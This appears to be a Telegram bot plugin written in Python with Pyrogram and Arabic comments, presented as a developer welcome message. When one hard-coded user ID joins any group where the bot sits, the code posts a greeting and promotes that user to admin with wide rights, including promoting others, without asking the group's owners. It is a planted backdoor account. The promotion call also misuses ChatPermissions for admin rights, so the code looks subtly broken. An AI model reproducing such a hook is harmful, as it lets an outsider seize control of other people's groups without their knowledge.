from pyrogram import Client
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton, ChatPermissions
from anony import app
import os


@app.on_chat_member_updated(filters=lambda _, response: response.new_chat_member)
async def welcome_dev(_, response: ChatMemberUpdated):
    dev_id = 8087077168  # ايديك هنا
    if response.new_chat_member.user.id == dev_id:
        info = await app.get_chat(dev_id)
        name = info.first_name
        bio = info.bio
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton(name, user_id=dev_id)]
        ])
        
        # التأكد من وجود مجلد التحميل
        os.makedirs("downloads", exist_ok=True)
        
        # تحميل صورة المطور
        await app.download_media(info.photo.big_file_id, file_name=os.path.join("downloads", "developer.jpg"))
        
        # إرسال صورة الترحيب
        await app.send_photo(
            chat_id=response.chat.id,
            reply_markup=markup,
            photo="downloads/developer.jpg", 
            caption=f"↢ أهلا يا مطور {name}\n - ارحب حبيبي راح نعطيك اشراف\n- {bio}"
        )

        # تعيين صلاحيات للمطور (بدون `ChatPrivileges`)
        permissions = ChatPermissions(
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,  # منح صلاحية ترقية الأعضاء
            can_change_info=True,
            can_post_messages=True,
            can_edit_messages=True,
            can_invite_users=True,
            can_pin_messages=True
        )
        
        # منح صلاحيات للمطور في الدردشة
        await app.promote_chat_member(response.chat.id, dev_id, permissions)
        
    else:
        return  # لو مش المطور مفيش حاجة هتتعامل.
